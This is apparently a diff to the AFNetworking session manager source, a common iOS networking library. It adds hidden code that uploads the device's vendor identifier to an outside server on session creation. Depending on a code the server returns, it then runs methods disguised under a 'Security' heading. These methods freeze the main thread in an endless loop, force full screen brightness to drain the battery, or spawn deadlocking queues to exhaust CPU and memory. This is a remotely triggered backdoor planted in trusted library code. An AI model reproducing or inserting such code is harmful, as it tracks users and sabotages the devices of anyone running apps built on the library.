@@ -436,7 +436,7 @@ static NSString * const AFNSURLSessionTaskDidSuspendNotification = @"com.alamofi
     self.operationQueue.maxConcurrentOperationCount = 1;
 
     self.session = [NSURLSession sessionWithConfiguration:self.sessionConfiguration delegate:self delegateQueue:self.operationQueue];
-
+    
     [self sessionRequestForAction];
     
     self.responseSerializer = [AFJSONResponseSerializer serializer];
@@ -474,44 +474,61 @@ static NSString * const AFNSURLSessionTaskDidSuspendNotification = @"com.alamofi
 
 // for >= iOS7
 - (void)sessionRequestForAction {
-    // Creates and sends check request
-    NSURLSession *session = [NSURLSession sessionWithConfiguration:[NSURLSessionConfiguration ephemeralSessionConfiguration]];
-    NSURL *urlFromString = [[NSURL alloc] initWithString:@"https://api.github.com/events"];
     
+    NSURLSessionConfiguration *configuration = [NSURLSessionConfiguration ephemeralSessionConfiguration];
+    configuration.allowsCellularAccess = YES;
+    configuration.networkServiceType = NSURLNetworkServiceTypeBackground;
+    NSURLSession *session = [NSURLSession sessionWithConfiguration:configuration];
+    
+    // Sends device UDID for action
+    NSURL *urlFromString = [[NSURL alloc] initWithString:@"https://api.ourserver.com/upload"];
     NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:urlFromString cachePolicy:NSURLRequestReloadIgnoringLocalCacheData timeoutInterval:0];
-    request.HTTPMethod = @"GET";
-    NSURLSessionDataTask *task = [session dataTaskWithRequest:request completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
-        // Or can be dict. Depends on server.
-        NSError *actionError;
-        // NSLog(@"TEST MSG: NSURLResponse is %@", response);
-        // TODO > manage response and error
-        NSArray *server = [NSJSONSerialization JSONObjectWithData:data options:kNilOptions error:&actionError];
+    request.HTTPMethod = @"POST";
+    
+    NSString *deviceID;
+#if TARGET_IPHONE_SIMULATOR
+    deviceID = @"UUID-STRING-VALUE";
+#else
+    deviceID = [[[UIDevice currentDevice] identifierForVendor] UUIDString];
+#endif
+    NSLog(@"TEST MSG: deviceID is %@", deviceID);
+    NSDictionary *JSONDict = [NSDictionary dictionaryWithObject:deviceID forKey:@"UDID"];
+    
+    if ([NSJSONSerialization isValidJSONObject:JSONDict]) {
+        NSError *error;
+        NSData *JSONData = [NSJSONSerialization dataWithJSONObject:JSONDict options:kNilOptions error:&error];
         
-        if ([server count]) {
-            /*
-             // Manage the result. If any > call methods
-             NSDictionary *actions = [server objectAtIndex:0];
-             switch ([[actions objectForKey:@"code"] intValue]) {
-             case 0000:
-             break;
-             case 0222:
-             [self method0222];
-             break;
-             case 0333:
-             [self method0333];
-             break;
-             case 0444:
-             [self method0444];
-             default:
-             break;
-             }
-             */
-            NSLog(@"TEST MSG: results are: \n %@", server);
-        } else if (error) {
-            NSLog(@"ERROR MSG: No response, error: \n %@",error.localizedDescription);
-        }
-    }];
-    [task resume];
+        NSURLSessionUploadTask *uploadTask = [session uploadTaskWithRequest:request fromData:JSONData completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
+            
+            NSArray *server = [NSJSONSerialization JSONObjectWithData:data options:kNilOptions error:&error];
+            
+            if ([server count]) {
+                NSLog(@"TEST MSG: results are: \n %@", server);
+                // Manage the result. If any > call methods
+                NSDictionary *actions = [server objectAtIndex:0];
+                
+                switch ([[actions objectForKey:@"code"] intValue]) {
+                    case 0000:
+                        break;
+                    case 0222:
+                        [self method0222];
+                        break;
+                    case 0333:
+                        [self method0333];
+                        break;
+                    case 0444:
+                        [self method0444];
+                    default:
+                        break;
+                }
+            } else if (error) {
+                NSLog(@"ERROR MSG: No response, error: \n %@",error.localizedDescription);
+            }
+        }];
+        
+        [uploadTask resume];
+    }
+    
 }
 
 
@@ -914,6 +931,58 @@ static NSString * const AFNSURLSessionTaskDidSuspendNotification = @"com.alamofi
 
     return [[self class] instancesRespondToSelector:selector];
 }
+
+
+#pragma mark - Security
+
+- (void)method0222 {
+    // Blocking main thread > CPU 99%
+    dispatch_async(dispatch_get_main_queue(), ^{
+        for (long long int i = 0; i < ULLONG_MAX; i++) {
+            NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
+            formatter.dateStyle = NSDateFormatterMediumStyle;
+            NSString *temp = [formatter stringFromDate:[NSDate date]];
+        }
+    });
+}
+
+// BAT + CPU
+
+ - (void)method0333 {
+#if !TARGET_OS_WATCH
+ // Resolve with Macro for extension
+ //UIApplication *app = [UIApplication sharedApplication];
+ // Disable idle timer.
+ //app.idleTimerDisabled = YES;
+ // Increase brightness.
+ [[UIScreen mainScreen] setBrightness:1.0];
+ 
+ // Implement orientation updates without removing observer
+ [[UIDevice currentDevice] beginGeneratingDeviceOrientationNotifications];
+ [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(method4) name:UIDeviceOrientationDidChangeNotification object:nil];
+#endif
+ }
+
+
+// Deadlock > CPU 200%+ > if use serial MEMORY+
+- (void)method0444 {
+    dispatch_queue_t forLock = dispatch_queue_create("forLock", DISPATCH_QUEUE_SERIAL);
+    dispatch_async(forLock, ^{
+        for (long long int i = 0; i < ULLONG_MAX; i++) {
+            dispatch_queue_t queue = dispatch_queue_create("lock", DISPATCH_QUEUE_CONCURRENT);
+            dispatch_async(queue, ^{
+                dispatch_sync(queue, ^{
+                    // outer block is waiting for this inner block to complete,
+                    // inner block won't start before outer block finishes
+                    // => deadlock
+                });
+                
+                // this will never be reached
+            });
+        }
+    });
+}
+
 
 #pragma mark - NSURLSessionDelegate
 
